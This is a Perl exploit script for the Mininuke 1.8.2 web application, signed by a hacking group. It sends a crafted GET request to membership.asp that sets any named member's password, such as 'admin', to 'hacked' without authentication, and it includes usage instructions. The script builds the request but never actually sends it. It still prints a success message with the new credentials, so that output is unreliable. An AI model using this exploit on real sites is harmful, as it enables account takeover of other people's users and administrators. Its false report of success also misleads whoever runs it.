#!/usr/bin/perl
#--------------------------------------------------------#
#-      => Mininuke  1.8.2
#-      Founder nukedx & Exploit by Hessam-x
#-      www.Hackerz.ir Iran Hackers Security Team
#-      Hessam-x  <> irc0d3r|at|Yahoo.com
#-      Spescial Thanx : all iranian Hackers & Str0ke
#-      IR4N H4CK3RZ S3CURITY T34M
#--------------------------------------------------------#
# This bug at Membership.asp
use IO::Socket;

if (@ARGV < 1)
{
print "\n============================================\n";
print "\n         IRAN HACKERZ SECURITY TEAM         \n";
print "\n============================================\n";
print "\n                                              ";
print "\n   MININUKE 1.8.2                             ";
print "\n   Exploit by Hessam-x & Found by nukedx      ";
print "\n   www.Hackerz.ir Iran Hackers Security Team  ";
print "\n                                              ";
print "\n============================================\n";
print "Usage : minimuke.pl [HOST] [Member name]\n\n";

  print "Examples:\n\n";
 print "   mininuke.pl www.Site.com admin \n";
 exit();
}

my $host = $ARGV[0];
my $usero= $ARGV[1];
my $remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host,
PeerPort => "80" );

unless ($remote) { die "Cannot connect to $host" }

print "[+]connected\n";

$addr = "GET /membership.asp?pass=hacked&passa=hacked&x=$usero&B1=Send HTTP/1.0\n";
$addr .= "Host: $host\n\n\n\n";
print "\n";
print "[+]Wait...";
sleep(5);
print "Wait For Changing Password ...\n";
print "[+] :D OK \n";
print "Username: $usero\n";
print "Password: hacked\n\n";
